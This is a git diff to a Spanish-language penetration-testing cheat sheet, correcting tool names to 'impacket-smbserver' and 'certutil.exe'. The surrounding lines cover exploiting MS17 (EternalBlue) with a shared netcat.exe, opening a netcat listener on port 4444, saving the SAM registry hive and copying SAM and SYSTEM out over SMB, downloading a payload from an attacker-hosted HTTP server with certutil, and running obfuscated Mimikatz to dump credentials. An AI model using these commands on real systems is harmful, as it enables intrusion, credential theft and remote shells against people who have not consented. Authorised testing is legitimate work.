@@ -17,7 +17,7 @@ crackmapexec smb ip.victima
 
 ### Explotación de MS17
 
-Para explotar manualmente MS17, hay que crear un recurso con `impacket-smb` que contenga `netcat.exe`. 
+Para explotar manualmente MS17, hay que crear un recurso con `impacket-smbserver` que contenga `netcat.exe`. 
 
 Ejemplo:
 
@@ -31,13 +31,13 @@ Usando el exploit de zzz: viene con un checker que permite ver si es vulnerable 
 Comando para compartir el recurso:
 
 ```bash
-impacket-smb smbfolder $(pwd) --smb2support
+impacket-smbserver smbfolder $(pwd) --smb2support
 ```
 
 Otra forma:
 
 ```bash
-impacket-smb smbfolder=/tmp/recurso/que/quiero/compartir
+impacket-smbserver smbfolder=/tmp/recurso/que/quiero/compartir
 ```
 
 **Poner en escucha con netcat en el puerto 4444**:
@@ -62,7 +62,7 @@ reg save HKLM\sam sam.backup
 Compartir archivos por red desde Windows después de crear copias de SAM y SYSTEM usando el recurso compartido:
 
 ```bash
-impacket-smb smbfolder $(pwd) --smb2support
+impacket-smbserver smbfolder $(pwd) --smb2support
 ```
 
 Copiar los archivos:
@@ -140,7 +140,7 @@ python3 -m http.server 8080
 En Windows, descargar el archivo:
 
 ```bash
-certutils.exe -f -urlcache -split http://ip.linux/archivo_legitimo.exe
+certutil.exe -f -urlcache -split http://ip.linux/archivo_legitimo.exe
 ```
 
 Luego, ejecutar el `Mimikatz` ofuscado y dumpear credenciales:
